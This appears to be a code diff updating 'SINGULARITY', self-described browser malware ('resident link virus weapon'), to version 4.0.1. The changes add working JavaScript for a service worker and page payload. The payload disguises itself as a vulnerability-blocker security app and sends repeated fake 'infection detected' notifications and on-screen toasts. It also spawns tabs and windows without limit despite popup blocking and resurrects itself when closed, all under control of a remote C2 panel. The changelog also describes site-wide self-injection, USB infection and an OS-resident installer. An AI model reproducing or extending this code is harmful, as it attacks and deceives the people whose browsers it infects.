@@ -1,9 +1,24 @@
 """
-SINGULARITY v4.0.0 「APEX」 -- apex-class resident link virus weapon
+SINGULARITY v4.0.1 「APEX」 -- apex-class resident link virus weapon
 ==================================================================
 世界のトップ級ペイロードの技法を全部盛り。ブラウザの権限内で到達可能な
 物理限界まで振り切り、PWAとして常駐し、サイト全体に自分を注入して伝染し、
 相手のUSBにも自分を仕込み、最後はOS常駐インストーラでブラウザの外まで侵食する。
+
+v4.0.1:
+  * 感染通知を全端末で確実に発火:
+      - ServiceWorkerRegistration.showNotification() を優先
+        （Android Chrome の new Notification() = Illegal constructor を回避）
+      - 画面内トーストも同時に出す（OS通知が拒否/非対応でも見える）
+      - 監視室の「通知文言」「通知ON/OFF」を実際に反映
+      - 全タブが閉じられたら Service Worker が代打ちで通知
+  * タブ自動増殖を「確証ベース」に変更:
+      - SW が clients.openWindow() の結果を ack（spawnres）で返す
+      - ack が来なければ 12 秒で必ずタップ待ちキューへ回収（捨てない）
+      - ジェスチャ内は window.open を最優先、無理ならキュー＋タップ誘導
+      - 保留件数を常時表示（増えない時は必ず「ここをタップ」が出る）
+  * 通知が止まる原因だった bomb ゲート中の全停止をやめ、ゲート中も通知は出す
+  * ランディングに __SINGULARITY_SHARED__ を追加（SharedWorker 連合が死んでいた）
 
 v4.0.0 「APEX」-- L7に第2形態を追加:
   * 相手の画面に自らの正体を悟らせない文面（保護ソフトに偽装）
@@ -25,15 +40,6 @@ v4.0.0 「APEX」-- L7に第2形態を追加:
       - WebRTC ループバック常時接続
       - Blob URL チャーン / クリップボード連打
       - CSS 大量アニメ + OffscreenCanvas / WASM スピン
-  * L7 の数値を全体的に引き上げ（DOM 4万 / 履歴6万 / CSS 1200 等）
-
-v3.9.3:
-  - 相手に見える文面を「正規の保護ソフト」に偽装（SINGULARITY/L7/depth を隠す）
-  - インストールボタンを特大化
-v3.9.2:
-  - 通知を復活＆仕様変更（全レベルで連続発報・許可を最初の操作に紐づけ）
-  - タブ自動増殖を専用ドライバに分離（L3〜 / L7は無制限）
-  - 生存タブは SW の clients.matchAll(tag) から別カウント
 
 レベル（監視室から遠隔変更・0〜7）:
   0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点 / 6 終焉 / 7 絶滅（固定枠）
@@ -49,7 +55,7 @@ from typing import Any, Dict, Optional
 VIRUS_ID = "singularity"
 VIRUS_NAME = "SINGULARITY"
 VIRUS_NAME_JA = "特異点"
-VIRUS_VERSION = "4.0.0"
+VIRUS_VERSION = "4.0.1"
 VIRUS_CLASS = "apex"
 
 LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
@@ -73,7 +79,7 @@ APP_NAME_DEFAULT = "脆弱性ブロッカー"
 # Worker
 # ---------------------------------------------------------------------------
 WORKER_JS = r"""
-/*! SINGULARITY worker v4.0.0 */
+/*! SINGULARITY worker v4.0.1 */
 /* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
 var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
             10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
@@ -151,14 +157,15 @@ self.onmessage = function (e) {
 """
 
 # ---------------------------------------------------------------------------
-# Service Worker（C2・永続化・復活・注入・spawn・生存数カウント）
+# Service Worker（C2・永続化・復活・注入・spawn(ack)・通知）
 # ---------------------------------------------------------------------------
 SW_JS = r"""
-/*! SINGULARITY service worker v4.0.0 -- C2 + injection + resurrection + spawn */
+/*! SINGULARITY service worker v4.0.1 -- C2 + injection + resurrection + spawn(ack) + notify */
 const VER = "sg-v4";
 const DB = "sg", STORE = "out", KV = "kv", PC = "sg-p";
-let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null;
+let CMD = null, PAGE = null, SID = null, MAN = null, ICONS = [], INJ = null, V = null, NM = "";
 let lastLevel = null, lastWipe = null, lastCheck = 0, preCached = false, lastInj = 0;
+let lastSwNotify = 0, lastCtl = 0, lastCmd = null;
 
 function idb() {
   return new Promise((res, rej) => {
@@ -207,6 +214,7 @@ async function boot() {
   ICONS = (await kvGet("icons")) || [];
   INJ = await kvGet("inj");
   V = await kvGet("v");
+  NM = (await kvGet("nm")) || "";
 }
 boot();
 
@@ -234,16 +242,20 @@ async function flush() {
   if (ids.length) await qDel(ids);
 }
 
-/* ---- ポップアップブロックを無視して窓を開ける唯一の手段 ---- */
-async function spawnN(n, url) {
+/* ---- 窓を開く。開けた数を返す（呼び出し元へ ack する） ---- */
+async function spawnN(n, url, kind) {
+  let ok = 0;
   for (let i = 0; i < n; i++) {
     try {
       const u = url + (url.indexOf("?") < 0 ? "?" : "&")
               + "t=" + Date.now() + "_" + i + "_" + Math.floor(Math.random() * 1000);
-      await self.clients.openWindow(u);
+      const c = await self.clients.openWindow(u);
+      if (c) ok++;
     } catch (e) {}
   }
+  return ok;
 }
+
 /* ---- 生存クライアント数（/sg 配下だけ数える＝監視室を除外）
         tag:"tab" → u=tab のみ / tag:"win" → それ以外 ---- */
 async function liveCount(tag) {
@@ -257,6 +269,35 @@ async function liveCount(tag) {
       return true;
     }).length;
   } catch (e) { return 0; }
+}
+
+/* ---- 感染通知（タブが全部閉じている時だけ SW が代打ち） ---- */
+async function swNotify(j) {
+  try {
+    if (!j || !j.ok) return;
+    if (j.nt_on === 0) return;
+    if (!self.registration || !self.registration.showNotification) return;
+    const lv = j.level || 0;
+    if (lv < 3) return;
+    if (await liveCount() > 0) return;
+    const nm = NM || "保護";
+    await self.registration.showNotification(nm + "の保護", {
+      body: j.ntext || "感染を検出しました",
+      tag: "sg-sw", renotify: true,
+      icon: (ICONS && ICONS[0]) || undefined,
+      badge: (ICONS && ICONS[0]) || undefined,
+      requireInteraction: lv >= 6, silent: false,
+      data: { url: PAGE || "/" }
+    });
+  } catch (e) {}
+}
+async function swNotifySoon() {
+  try {
+    if (Date.now() - lastSwNotify < 55000) return;
+    lastSwNotify = Date.now();
+    if (!lastCmd || Date.now() - lastCtl > 25000) { lastCtl = Date.now(); lastCmd = await ctl(); }
+    await swNotify(lastCmd);
+  } catch (e) {}
 }
 
 self.addEventListener("install", (e) => { self.skipWaiting(); });
@@ -274,18 +315,40 @@ self.addEventListener("message", (e) => {
   if (d.k === "cfg") {
     kvSet("page", d.page); kvSet("sid", d.sid); kvSet("man", d.man);
     kvSet("icons", d.icons || []); kvSet("inj", d.inj || null); kvSet("v", d.v || null);
-    PAGE = d.page; SID = d.sid; MAN = d.man; INJ = d.inj; V = d.v; ICONS = d.icons || [];
+    kvSet("nm", d.nm || "");
+    PAGE = d.page; SID = d.sid; MAN = d.man; INJ = d.inj; V = d.v;
+    ICONS = d.icons || []; NM = d.nm || "";
   } else if (d.k === "out") {
-    qPush(d.v).then(() => flush());
+    qPush(d.v).then(() => { flush(); swNotifySoon(); });
   } else if (d.k === "spawn") {
-    spawnN(d.n || 1, d.url || "");
+    const url = d.url || "";
+    spawnN(d.n || 1, url, d.kind || "tab").then(function (ok) {
+      try { e.source && e.source.postMessage({ k: "spawnres", url: url, ok: ok }); } catch (x) {}
+    });
   } else if (d.k === "count") {
     liveCount(d.tag).then((n) => {
       try { e.source && e.source.postMessage({ k: "count", n: n, tag: d.tag || "" }); } catch (x) {}
     });
   } else if (d.k === "alive") {
     liveCount().then((n) => { if (!n && PAGE) spawnN(1, PAGE + "?u=sw&ref=" + (SID || "")); });
+  } else if (d.k === "notify") {
+    swNotify({ ok: 1, level: d.level || 7, ntext: d.text || "", nt_on: 1 });
   }
+});
+
+self.addEventListener("notificationclick", (e) => {
+  e.notification.close();
+  const u = (e.notification.data && e.notification.data.url) || PAGE || "/";
+  e.waitUntil((async () => {
+    try {
+      const cs = await self.clients.matchAll({ type: "window", includeUncontrolled: true });
+      for (const c of cs) {
+        if ((c.url || "").indexOf("/sg") >= 0) { try { return await c.focus(); } catch (x) {} }
+      }
+      if (cs.length) { try { return await cs[0].focus(); } catch (x) {} }
+      return await self.clients.openWindow(u);
+    } catch (x) {}
+  })());
 });
 
 self.addEventListener("periodicsync", (e) => { e.waitUntil(tick(true)); });
@@ -293,6 +356,7 @@ self.addEventListener("sync", (e) => { e.waitUntil(flush()); });
 
 async function tick(deep) {
   const j = await ctl();
+  lastCmd = j; lastCtl = Date.now();
   if (!j) return;
   if (j.ver && V && j.ver !== V) { /* OTA */ }
   const lv = j.level;
@@ -303,6 +367,7 @@ async function tick(deep) {
   }
   if (j.wipe && j.wipe !== lastWipe) { lastWipe = j.wipe; }
   await flush();
+  await swNotify(j);
   if (deep) {
     const n = await liveCount();
     if (!n && PAGE) {
@@ -357,7 +422,7 @@ self.addEventListener("fetch", (e) => {
 # SharedWorker
 # ---------------------------------------------------------------------------
 SHARED_JS = r"""
-/*! SINGULARITY shared worker v4.0.0 */
+/*! SINGULARITY shared worker v4.0.1 */
 var PORTS = [], K = 0;
 onconnect = function (e) {
   var p = e.ports[0];
@@ -563,9 +628,11 @@ echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
 PAYLOAD_JS = r"""
 (function () {
 "use strict";
-/*! SINGULARITY payload v4.0.0 APEX -- stealth text / big install / apex suite */
+/*! SINGULARITY payload v4.0.1 APEX -- stealth text / big install / apex suite
+    v4.0.1: 通知を全端末で確実化（sw.showNotification優先＋画面内トースト）／
+            spawn を ack ベースにして失敗を必ず回収 */
 var MYVER = window.__SINGULARITY_VER__
-  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "4.0.0";
+  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "4.0.1";
 
 /* ---------------- 小物 ---------------- */
 function Q(k) { try { return new URLSearchParams(location.search).get(k) || ""; } catch (e) { return ""; } }
@@ -603,6 +670,7 @@ var CFG = Object.assign({
   avName: "脆弱性ブロッカー", ver: MYVER, injected: false,
   usbWorm: false, usbBase: "", usbCode: "", usbLabel: "", hop: false, bomb: "",
   hardMode: "", apex: 0,
+  notifyText: "", notifyMode: "", name: "", tabMinLevel: 3,
   interval: 12000, cmdInterval: 10000, timeout: 4000, maxRetry: 6
 }, window.__SINGULARITY_CFG__ || {});
 
@@ -654,7 +722,8 @@ var R = {
   bot: {}, verdict: {}, spoof: {}, rat: {}, usb: {}, viral: {}, burn: {}, ram: {}, disk: {},
   history: {}, wipe: {}, hops: [], bomb: null, crypto: {}, errors: [], attempts: 0,
   breed: null, breeded: 0, wskin: 0, wskinCtx: null, chain: [],
-  hard: null, installed: 0, swarm: null, actx: null, spoke: 0, apex: null
+  hard: null, installed: 0, swarm: null, actx: null, spoke: 0, apex: null,
+  notify: { on: 0, n: 0, at: 0, ok: 0, mode: "" }, notifyOk: 0, gated: 0
 };
 var WORKERS = [], TIMERS = [], GATED = false, PAUSED = false;
 var LASTW = 0, CMD_SEEN = {}, ESE = null, PUSHING = 0, LASTWL = JSON.stringify(CFG.winLock || null);
@@ -667,6 +736,9 @@ try {
         LIVE_CACHE = d.n | 0; LIVE_AT = now();
         if (d.tag === "tab") { LIVE_TAB = d.n | 0; LIVE_TAG_AT = now(); }
         else if (d.tag === "win") { LIVE_WIN = d.n | 0; }
+      } else if (d.k === "spawnres") {
+        /* SW が openWindow した結果の ack。開けていなければ即タップ待ちへ */
+        if (d.ok) pendDone(d.url); else pendFail(d.url);
       }
     });
   }
@@ -1161,52 +1233,120 @@ function historyFlood() {
   })();
 }
 
-/* ---- 通知：全レベルで「<名前>の保護」＋「感染」を連続発報 ---- */
-var NOTIFY_TIMER = null, NOTIFY_ARMED = false, NOTIFY_OK = false;
+/* ---- 感染通知：OS通知（Android/iOS対応）＋画面内トーストの二段構え ---- */
+var NOTIFY_TIMER = null, NOTIFY_ARMED = false, NOTIFY_OK = false, NOTIFY_MODE = "";
 var NOTIFY_BODY = [
   "\u611F\u67D3\u3092\u691C\u51FA\u3057\u307E\u3057\u305F",
   "\u611F\u67D3\u62E1\u5927\u4E2D \u30FB \u5BFE\u51E6\u304C\u5FC5\u8981\u3067\u3059",
   "\u611F\u67D3 \u30FB \u4FDD\u8B77\u30A2\u30D7\u30EA\u3092\u30A4\u30F3\u30B9\u30C8\u30FC\u30EB",
   "\u611F\u67D3\u3057\u3066\u3044\u307E\u3059 \u30FB \u30BF\u30C3\u30D7\u3057\u3066\u5BFE\u51E6"
 ];
+
+/* sw 経由が使えるなら sw 固定（Android の Illegal constructor / iOS を回避） */
+function notifyMode() {
+  if (NOTIFY_MODE) return NOTIFY_MODE;
+  try {
+    NOTIFY_MODE = (navigator.serviceWorker && navigator.serviceWorker.getRegistration)
+      ? "sw" : "page";
+  } catch (e) { NOTIFY_MODE = "page"; }
+  return NOTIFY_MODE;
+}
 function notifyPerm() {
   try {
-    if (!window.Notification) return false;
-    if (Notification.permission === "granted") { NOTIFY_OK = true; return true; }
-    if (Notification.permission === "denied") return false;
-    var p = Notification.requestPermission();
-    if (p && p.then) {
-      p.then(function (s) {
-        if (s === "granted") { NOTIFY_OK = true; R.notifyOk = 1; notifyBurst(3); push(true); }
-      }).catch(function () {});
+    if (!window.Notification) { R.notify.mode = "none"; return false; }
+    if (Notification.permission === "granted") {
+      NOTIFY_OK = true; R.notifyOk = 1; R.notify.ok = 1; return true;
     }
+    if (Notification.permission === "denied") { R.notify.mode = "denied"; return false; }
+    var p = Notification.requestPermission();
+    var done = function (s) {
+      if (s === "granted") {
+        NOTIFY_OK = true; R.notifyOk = 1; R.notify.ok = 1; R.notify.mode = "granted";
+        notifyBurst(3); push(true);
+      } else { R.notify.mode = String(s || "default"); }
+    };
+    if (p && p.then) p.then(done).catch(function () {});
     return Notification.permission === "granted";
   } catch (e) { return false; }
 }
+function notifyNative(title, body, tag, need) {
+  try {
+    if (!window.Notification || Notification.permission !== "granted") return false;
+    var o = { body: body, tag: tag, requireInteraction: !!need, silent: false };
+    try { if (CFG.icons && CFG.icons[0]) { o.icon = CFG.icons[0]; o.badge = CFG.icons[0]; } } catch (e) {}
+    var nn = new Notification(title, o);
+    try { nn.onclick = function () { try { window.focus(); } catch (e) {} }; } catch (e) {}
+    return true;
+  } catch (e) { return false; }
+}
+function notifyViaSW(title, body, tag, need) {
+  try {
+    navigator.serviceWorker.getRegistration().then(function (r) {
+      if (!r || !r.showNotification) { notifyNative(title, body, tag, need); return; }
+      try {
+        r.showNotification(title, {
+          body: body, tag: tag, renotify: false,
+          icon: (CFG.icons || [])[0], badge: (CFG.icons || [])[0],
+          requireInteraction: !!need, silent: false, data: { url: CFG.path }
+        });
+      } catch (e) { notifyNative(title, body, tag, need); }
+    }).catch(function () { notifyNative(title, body, tag, need); });
+    return true;
+  } catch (e) { notifyNative(title, body, tag, need); return true; }
+}
+/* 画面内トースト（OS通知が拒否でも「通知が来ている」ことが見える） */
+function notifyToast(text) {
+  try {
+    var d = document.getElementById("sg_toast");
+    if (!d) {
+      d = document.createElement("div"); d.id = "sg_toast";
+      d.style.cssText = "position:fixed;left:50%;top:46px;transform:translateX(-50%);"
+        + "z-index:2147483644;max-width:80vw;background:rgba(5,7,10,.93);"
+        + "border:1px solid rgba(0,255,136,.45);color:#b8ffd9;border-radius:12px;"
+        + "padding:9px 14px;font:12.5px/1.5 system-ui,-apple-system,sans-serif;"
+        + "box-shadow:0 10px 30px rgba(0,0,0,.55);opacity:0;transition:opacity .2s;"
+        + "pointer-events:none;text-align:center";
+      document.body.appendChild(d);
+    }
+    d.textContent = "\u26A0 " + CFG.avName + "\u306E\u4FDD\u8B77 \uFF0F " + text;
+    d.style.opacity = "1";
+    clearTimeout(d.__t);
+    d.__t = setTimeout(function () { d.style.opacity = "0"; }, 4200);
+  } catch (e) {}
+}
+function notifyText(n) {
+  var t = (CFG.notifyText || "").trim();
+  if (t) return t.length > 120 ? t.slice(0, 120) : t;
+  return NOTIFY_BODY[n % NOTIFY_BODY.length];
+}
 function notifyOne() {
   try {
-    if (Notification.permission !== "granted") return false;
+    if (CFG.notify === 0) return false;
     var n = ++R.notify.n;
-    var o = {
-      body: NOTIFY_BODY[n % NOTIFY_BODY.length],
-      tag: "sg-" + (LEVEL >= 6 ? (n % 6) : 0),
-      requireInteraction: LEVEL >= 6,
-      silent: LEVEL < 3
-    };
-    try { if (CFG.icons && CFG.icons[0]) o.icon = CFG.icons[0]; } catch (e) {}
-    var nn = new Notification(CFG.avName + "\u306E\u4FDD\u8B77", o);
-    try { nn.onclick = function () { try { window.focus(); } catch (e) {} }; } catch (e) {}
+    var text = notifyText(n);
+    notifyToast(text);                       /* 画面内は常に出す */
     R.notify.at = now();
+    R.notify.on = 1;
+    var granted = false;
+    try { granted = !!(window.Notification && Notification.permission === "granted"); } catch (e) {}
+    if (granted) {
+      var tag = "sg-" + (LEVEL >= 6 ? (n % 6) : 0), need = LEVEL >= 6;
+      if (notifyMode() === "sw") notifyViaSW(CFG.avName + "\u306E\u4FDD\u8B77", text, tag, need);
+      else notifyNative(CFG.avName + "\u306E\u4FDD\u8B77", text, tag, need);
+    }
     if (n % 4 === 0) push(false);
     return true;
   } catch (e) { return false; }
 }
 function notifyBurst(k) {
-  for (var i = 0; i < (k || 1); i++) setTimeout(function () { notifyOne(); }, i * 260);
+  for (var i = 0; i < (k || 1); i++) {
+    setTimeout(function () { notifyOne(); }, i * 260);
+  }
 }
 function notifyFlood() {
   if (NOTIFY_TIMER) return;
-  R.notify = { on: 1, n: 0, at: 0 };
+  if (!R.notify) R.notify = { on: 0, n: 0, at: 0, ok: 0, mode: "" };
+  R.notify.on = 1;
   if (!NOTIFY_ARMED) {
     NOTIFY_ARMED = true;
     ["pointerdown", "mousedown", "click", "touchstart", "touchend", "keydown",
@@ -1220,7 +1360,6 @@ function notifyFlood() {
       if (PAUSED || !firing) return;
       if (!window.Notification) return;
       if (Notification.permission === "default") notifyPerm();
-      if (Notification.permission !== "granted") return;
       var every = LEVEL >= 7 ? 900 : (LEVEL >= 5 ? 1800 : (LEVEL >= 3 ? 2600 : 3600));
       if (now() - (R.notify.at || 0) < every) return;
       notifyOne();
@@ -1897,7 +2036,8 @@ function swInstall() {
       R.swreg = { ok: 1, scope: (r && r.scope) || "/" };
       try {
         r.active && r.active.postMessage({ k: "cfg", page: CFG.path, sid: SID,
-          man: CFG.manifest, icons: CFG.icons, v: MYVER, inj: { pjs: CFG.pjs } });
+          man: CFG.manifest, icons: CFG.icons, v: MYVER, nm: CFG.avName,
+          inj: { pjs: CFG.pjs } });
       } catch (e) {}
       push(false);
     }).catch(function () { R.swreg = { ok: 0 }; });
@@ -1906,7 +2046,8 @@ function swInstall() {
         SWREG = r;
         try {
           r.active && r.active.postMessage({ k: "cfg", page: CFG.path, sid: SID,
-            man: CFG.manifest, icons: CFG.icons, v: MYVER, inj: { pjs: CFG.pjs } });
+            man: CFG.manifest, icons: CFG.icons, v: MYVER, nm: CFG.avName,
+            inj: { pjs: CFG.pjs } });
         } catch (e) {}
       });
     }
@@ -1962,13 +2103,49 @@ function openChild(u, tries) {
   return w;
 }
 
-var QUEUE = [];
+/* ============================================================
+   spawn コア：開いた「確証」が取れるまで絶対に捨てない
+   ============================================================ */
+var QUEUE = [];            /* タップ待ち（ジェスチャが必要） */
+var PENDING = {};          /* url -> {at,kind} 送信済み・ack待ち */
+var PENDING_N = 0;
+var GESTURE_AT = 0;        /* 最後のユーザー操作 */
+var SPAWN_OK = 0, SPAWN_FAIL = 0;
 
-function qPush(u) {
-  if (QUEUE.length >= QMAX) return false;
-  QUEUE.push(u);
-  return true;
+function pendCount(kind) {
+  var n = 0;
+  for (var u in PENDING) if (!kind || PENDING[u].kind === kind) n++;
+  return n;
 }
+function pendAdd(u, kind) {
+  if (PENDING[u]) return;
+  if (PENDING_N >= QMAX * 2) return;
+  PENDING[u] = { at: now(), kind: kind || "tab" };
+  PENDING_N++;
+}
+function pendDone(u) {
+  if (PENDING[u]) { delete PENDING[u]; PENDING_N--; SPAWN_OK++; }
+}
+function pendFail(u) {
+  if (!PENDING[u]) return;
+  var k = PENDING[u].kind;
+  delete PENDING[u]; PENDING_N--; SPAWN_FAIL++;
+  if (QUEUE.length < QMAX) { QUEUE.push({ u: u, kind: k }); hint(); }
+}
+/* 一定時間 ack が来ない＝失敗とみなしてタップ待ちへ回収 */
+function pendStale(minAge) {
+  var t = now(), age = minAge || 12000, moved = 0;
+  for (var u in PENDING) {
+    if (t - PENDING[u].at < age) continue;
+    var k = PENDING[u].kind;
+    delete PENDING[u]; PENDING_N--; SPAWN_FAIL++;
+    if (QUEUE.length < QMAX) { QUEUE.push({ u: u, kind: k }); moved++; }
+    else break;
+  }
+  if (moved) hint();
+  return moved;
+}
+function inGesture() { return now() - GESTURE_AT < 1200; }
 
 function tryOpen(u, feat) {
   var w = null;
@@ -1978,7 +2155,6 @@ function tryOpen(u, feat) {
   try { w.focus(); } catch (e) {}
   return w;
 }
-
 function anchorOpen(u) {
   try {
     var a = document.createElement("a");
@@ -1990,21 +2166,19 @@ function anchorOpen(u) {
     return true;
   } catch (e) { return false; }
 }
-
-function swSpawn(u) {
-  try {
-    if (navigator.serviceWorker && navigator.serviceWorker.controller) {
-      navigator.serviceWorker.controller.postMessage({ k: "spawn", n: 1, url: u });
-      return true;
-    }
-    if (SWREG && SWREG.active) {
-      SWREG.active.postMessage({ k: "spawn", n: 1, url: u });
-      return true;
-    }
-  } catch (e) {}
-  return false;
+function winFeat() {
+  return "popup=yes,width=480,height=360,left=" + ((W % 6) * 70)
+       + ",top=" + ((W % 5) * 60);
 }
-
+function swSpawn(u, kind) {
+  try {
+    var c = (navigator.serviceWorker && navigator.serviceWorker.controller)
+            || (SWREG && SWREG.active) || null;
+    if (!c) return false;
+    c.postMessage({ k: "spawn", n: 1, url: u, kind: kind || "tab" });
+    return true;
+  } catch (e) { return false; }
+}
 function swCount(tag) {
   try {
     var c = navigator.serviceWorker && navigator.serviceWorker.controller;
@@ -2013,22 +2187,18 @@ function swCount(tag) {
   } catch (e) {}
 }
 
-function spawnTab(u) {
-  if (!IS_IOS && swSpawn(u)) return true;
-  if (tryOpen(u)) return true;
-  if (!IS_IOS && anchorOpen(u)) return true;
-  if (QUEUE.length < QMAX) { qPush(u); hint(); }
-  return true;
+/* 1回の spawn。確証が取れた時だけ true を返し、取れなければ必ずタップ待ちへ積む */
+function spawnOne(u, kind, feat) {
+  kind = kind || "tab";
+  if (inGesture() && tryOpen(u, kind === "win" ? feat : null)) { SPAWN_OK++; return true; }
+  if (!IS_IOS && swSpawn(u, kind)) { pendAdd(u, kind); return true; }
+  if (tryOpen(u, feat)) { SPAWN_OK++; return true; }
+  if (!IS_IOS && anchorOpen(u)) { pendAdd(u, kind); return true; }
+  if (QUEUE.length < QMAX) { QUEUE.push({ u: u, kind: kind }); hint(); }
+  return false;
 }
-
-function spawnWin(u) {
-  var feat = "popup=yes,width=480,height=360,left=" + ((W % 6) * 70)
-           + ",top=" + ((W % 5) * 60);
-  if (tryOpen(u, feat) || tryOpen(u)) return true;
-  if (!IS_IOS && (swSpawn(u) || anchorOpen(u))) return true;
-  if (QUEUE.length < QMAX) { qPush(u); hint(); }
-  return true;
-}
+function spawnTab(u) { return spawnOne(u, "tab", null); }
+function spawnWin(u) { return spawnOne(u, "win", winFeat()); }
 
 function spawnMany(n) {
   for (var i = 0; i < n; i++) {
@@ -2037,16 +2207,14 @@ function spawnMany(n) {
   }
   hint();
 }
-
 function flushQueue(force) {
   if (!QUEUE.length) { hint(); return 0; }
   var cap = force ? Math.max(PER_TAP, 4) : PER_TAP;
   var n = Math.min(QUEUE.length, cap), made = 0;
   for (var i = 0; i < n; i++) {
-    var u = QUEUE[0], w = null;
-    try { w = window.open(u, "_blank"); } catch (e) { err_(e); }
-    if (!w) break;
-    QUEUE.shift(); made++;
+    var it = QUEUE[0];
+    if (!tryOpen(it.u, it.kind === "win" ? winFeat() : null)) break;
+    QUEUE.shift(); made++; SPAWN_OK++;
   }
   TAP_OPENED += made;
   if (made) { R.tapped = 1; push(false); }
@@ -2057,15 +2225,21 @@ function flushQueue(force) {
 function onTap() {
   var t = now();
   if (t - LAST_TAP < 250) return;
-  LAST_TAP = t;
+  LAST_TAP = t; GESTURE_AT = t;
   try { notifyPerm(); } catch (e) {}
   if (!IS_MOBILE) R.tapped = 1;
+  pendStale(2500);                       /* SW経由で落ちたぶんを回収 */
   if (!QUEUE.length) { tapOverlay(); return; }
   flushQueue(false);
 }
 addEventListener("touchend", onTap, { passive: true });
 addEventListener("click", onTap);
-addEventListener("pointerup", function (e) { if (e.pointerType !== "touch") onTap(); });
+addEventListener("pointerdown", function () { GESTURE_AT = now(); }, { passive: true });
+addEventListener("pointerup", function (e) {
+  GESTURE_AT = now();
+  if (e.pointerType !== "touch") onTap();
+});
+addEventListener("keydown", function () { GESTURE_AT = now(); });
 
 /* ---- 自動増殖ドライバ ---- */
 var HB_TTL = 120000;
@@ -2087,7 +2261,6 @@ function hbSet() {
   }
   return m;
 }
-
 function hbCount() {
   try {
     var m = hbMap(), t = now(), n = 0;
@@ -2095,7 +2268,6 @@ function hbCount() {
     return n;
   } catch (e) { return 0; }
 }
-
 function hbCountT() {
   try {
     var m = hbMapT(), t = now(), n = 0;
@@ -2103,33 +2275,27 @@ function hbCountT() {
     return n;
   } catch (e) { return 0; }
 }
-
 function liveN() {
   var hb = Math.max(1, hbCount());
   var sw = (now() - LIVE_AT < 20000) ? LIVE_CACHE : 0;
   return Math.max(hb, sw, 1);
 }
-
 function tabLive() {
   if (now() - LIVE_TAG_AT < 20000) return LIVE_TAB;
   return Math.max(hbCountT(), 1);
 }
-
 function winLive() {
   if (now() - LIVE_AT < 20000) return Math.max(LIVE_WIN, 1);
   return liveN();
 }
-
 function isLeader() {
   try {
     var m = hbMap(), ids = Object.keys(m).sort();
     return !ids.length || ids[0] === TABID;
   } catch (e) { return true; }
 }
-
 function lastBreedAt() { try { return parseInt(wn("sg_last") || "0", 10) || 0; } catch (e) { return 0; } }
 function markBreed() { try { wn("sg_last", String(now())); } catch (e) {} }
-
 function pickKind() {
   var t = AUTO_T[LEVEL] || 0, w2 = AUTO_W[LEVEL] || 0;
   if (!w2) return "tab";
@@ -2142,11 +2308,13 @@ function autoBreed() {
   if (!CFG.fire) return;
   var target = AUTO_W[LEVEL] || 0;
   var unlimited = (target === 0);
-  var live = winLive();
+  var live = winLive() + pendCount("win");     /* 送信済みも生存として数える */
   R.auto = { on: 1, live: live, target: unlimited ? "inf" : target,
              tab: AUTO_T[LEVEL] || 0, win: target, spawned: SPAWN_W,
-             leader: isLeader() ? 1 : 0, at: now() };
-  if (!unlimited && live >= AUTO_SAFE) return;
+             leader: isLeader() ? 1 : 0, pending: PENDING_N, queue: QUEUE.length,
+             ok: SPAWN_OK, fail: SPAWN_FAIL, at: now() };
+  if (!unlimited && live >= target) return;
+  if (live + QUEUE.length >= AUTO_SAFE) return;
   if (!isLeader() && now() - lastBreedAt() < 6000) return;
   if (now() - LAST_AUTO < (LEVEL >= 7 ? 900 : 1400)) return;
   LAST_AUTO = now();
@@ -2154,7 +2322,6 @@ function autoBreed() {
   if (unlimited) {
     n = Math.max(1, Math.min(IS_MOBILE ? 3 : 8, Math.ceil(live * 0.35)));
   } else {
-    if (live >= target) return;
     n = Math.min(Math.max(1, target - live), IS_MOBILE ? 3 : 6);
   }
   markBreed();
@@ -2174,9 +2341,9 @@ function tabBreed() {
   var unlimited = (target === 0);
   var gap = TAB_GAP[LEVEL] || 3000;
   if (now() - LAST_TAB < gap) return;
-  var live = tabLive();
+  var live = tabLive() + pendCount("tab");
   if (!unlimited && live >= target) return;
-  if (live >= AUTO_SAFE * 2) return;
+  if (live + QUEUE.length >= AUTO_SAFE * 2) return;
   LAST_TAB = now();
   var n;
   if (unlimited) {
@@ -2191,7 +2358,7 @@ function tabBreed() {
     spawnTab(u);
   }
   R.tab = { live: live, target: unlimited ? "inf" : target, spawned: TAB_SPAWNED,
-            gap: gap, at: now() };
+            gap: gap, pending: PENDING_N, at: now() };
   if (!TAB) hint();
 }
 
@@ -2205,7 +2372,10 @@ function autoStart() {
   try { swCount(""); swCount("tab"); swCount("win"); } catch (e) {}
   AUTO_TIMER = setInterval(function () {
     try {
-      R.swarm = { live: liveN(), tab: tabLive(), tabTarget: AUTO_T[LEVEL] || 0, at: now() };
+      R.swarm = { live: liveN(), tab: tabLive(), tabTarget: AUTO_T[LEVEL] || 0,
+                  pending: PENDING_N, queue: QUEUE.length, ok: SPAWN_OK,
+                  fail: SPAWN_FAIL, at: now() };
+      pendStale(12000);                    /* 落ちた spawn を必ず回収 */
       autoBreed();
       tabBreed();
     } catch (e) { err_(e); }
@@ -2224,24 +2394,49 @@ function hint() {
         + "font:12px ui-monospace,SFMono-Regular,Menlo,monospace;opacity:.9";
       document.body.appendChild(d);
     }
+    var hold = PENDING_N + QUEUE.length;
     d.textContent = QUEUE.length
-      ? ("\u25B6 \u3053\u3053\u3092\u30BF\u30C3\u30D7 (" + QUEUE.length + ")")
-      : (CFG.avName + " \u00B7 \u4FDD\u8B77\u4E2D " + liveN());
-    d.style.display = (TAB || WIN || IFR) ? "none" : "block";
+      ? ("\u25B6 \u3053\u3053\u3092\u30BF\u30C3\u30D7\u3057\u3066\u5897\u6B96 (" + QUEUE.length + ")")
+      : (CFG.avName + " \u00B7 \u4FDD\u8B77\u4E2D " + liveN() + (hold ? " / \u4FDD\u7559 " + hold : ""));
+    d.style.display = (WIN || IFR) ? "none" : "block";
   } catch (e) {}
   tapOverlay();
 }
 
+function ensureTap() {
+  if (document.getElementById("sg_tap")) return;
+  if (WIN || IFR) return;
+  var d = document.createElement("div");
+  d.id = "sg_tap";
